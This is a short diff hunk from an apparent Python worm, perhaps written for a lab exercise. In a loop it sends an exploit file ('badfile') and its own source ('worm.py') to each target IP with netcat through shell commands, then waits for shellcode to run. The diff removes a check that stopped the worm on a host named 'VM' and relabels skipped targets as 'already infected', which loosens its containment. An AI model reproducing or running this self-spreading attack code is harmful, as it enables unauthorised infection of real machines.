@@ -88,11 +88,10 @@ while True:
     	subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
     	time.sleep(5) 
     	subprocess.run([f"cat worm.py | nc -w5 {targetIP} 9000"], shell=True)
-    	if host=="VM":
-        	exit(0)
     	# Give the shellcode some time to run on the target host
     	time.sleep(11)
     else:
-    	print(f"{targetIP} is not alive", flush=True)
+    	print(f"{targetIP} already infected", flush=True)
+    	time.sleep(11)
     # Remove this line if you want to continue attacking others
     
